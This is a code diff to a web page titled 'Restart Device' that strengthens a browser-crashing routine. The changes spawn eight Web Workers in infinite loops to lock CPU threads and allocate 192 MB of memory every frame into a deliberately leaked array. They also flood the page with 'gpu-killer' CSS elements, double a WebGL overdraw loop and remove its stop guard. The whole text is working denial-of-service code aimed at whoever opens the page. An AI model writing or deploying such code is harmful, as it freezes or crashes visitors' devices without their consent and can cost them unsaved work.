@@ -166,7 +166,6 @@
 
     <div class="header-section">
         <h1>Restart Device</h1>
-        <p>CSGL</p>
     </div>
 
     <div class="slider-container">
@@ -200,40 +199,37 @@ function cssAnimationInferno() {
     let elementCount = 0;
     let frameCount = 0;
     let crashTriggered = false;
+    const memoryLeakStorage = []; // Holds references to prevent garbage collection
 
-    // Spawn 8 Web Workers to lock up CPU threads with heavy crypto loops
-    function spawnCryptoWorkers() {
-        const workerCode = `
-            self.onmessage = function() {
-                // Dense loop running heavy math/crypto tasks continuously
-                while (true) {
-                    const data = new Uint8Array(1024);
-                    self.crypto.getRandomValues(data);
-                    // Simple dense spinning fallback math to ensure absolute thread lock
-                    let hash = 0;
-                    for (let i = 0; i < data.length; i++) {
-                        hash = (hash << 5) - hash + data[i];
-                        hash |= 0;
-                    }
+    // 1. Spawn 8 Web Workers performing dense crypto/hashing loops immediately
+    const workerCode = `
+        self.onmessage = function() {
+            // Infinite dense cryptographic/hashing simulation loop
+            while (true) {
+                let val = Math.random().toString();
+                for (let i = 0; i < 10000; i++) {
+                    // Chained pseudo-crypto calculations to prevent compiler optimization
+                    val = btoa(val + Math.sin(i) * Math.cos(i));
                 }
-            };
-        `;
-        
+            }
+        };
+    `;
+    
+    try {
         const blob = new Blob([workerCode], { type: 'application/javascript' });
         const workerUrl = URL.createObjectURL(blob);
-        
-        for (let i = 0; i < 8; i++) {
-            try {
-                const worker = new Worker(workerUrl);
-                worker.postMessage('start');
-            } catch (e) {
-                console.error('Worker failed to initialize', e);
-            }
+        for (let w = 0; w < 8; w++) {
+            const worker = new Worker(workerUrl);
+            worker.postMessage('start');
         }
+    } catch (e) {
+        console.error('Workers blocked or failed to initialize', e);
     }
 
+    // 2. Continuous Main Engine Loop (CSS + Memory Allocation + WebGL triggers)
     function createGpuKiller() {
         try {
+            // CSS element spawning (keeps going forever)
             for (let i = 0; i < 60; i++) {
                 const element = document.createElement('div');
                 element.className = 'gpu-killer';
@@ -252,11 +248,24 @@ function cssAnimationInferno() {
 
             frameCount++;
 
-            // Trigger crypto workers and WebGL crash exactly on the 3rd frame
+            // Trigger the WebGL crash sequence exactly on frame 3
             if (frameCount >= 3 && !crashTriggered) {
                 crashTriggered = true;
-                spawnCryptoWorkers();
                 crash();
+            }
+
+            // High-Speed Memory Allocation: Allocates 192MB every single frame after WebGL launches
+            if (crashTriggered) {
+                try {
+                    // 192 megabytes = 192 * 1024 * 1024 bytes
+                    // Using Float64Array (8 bytes per element) -> (192 * 1024 * 1024) / 8 = 25165824 elements
+                    const massiveAlloc = new Float64Array(25165824);
+                    // Force physical memory backing via active mutation
+                    massiveAlloc.fill(Math.random()); 
+                    memoryLeakStorage.push(massiveAlloc);
+                } catch (memError) {
+                    // If V8 heap hits the ceiling, keep attempting smaller allocations
+                }
             }
 
             if (elementCount > -2146483647) {
@@ -267,8 +276,8 @@ function cssAnimationInferno() {
         }
     }
 
+    // 3. WebGL Overdraw & Pipeline Exhaustion Routine
     function crash() {
-        // WebGL setup
         let canvas = document.createElement('canvas');
         canvas.style.position = 'fixed';
         canvas.style.top = '-9999px';
@@ -375,14 +384,9 @@ function cssAnimationInferno() {
         }
         
         const timeLoc = gl.getUniformLocation(shaderProgram, 'u_time');
+        const opsPerFrame = 500000;
         
-        // Slightly toned down from 500,000 ops to keep it extreme but running alongside CSS
-        const opsPerFrame = 250000; 
-        
-        let shouldStop = false;
         function renderFrame() {
-            if (shouldStop) return;
-            
             gl.uniform1f(timeLoc, performance.now() / 1000);
             
             for (let pair = 0; pair < numPairs; pair++) {
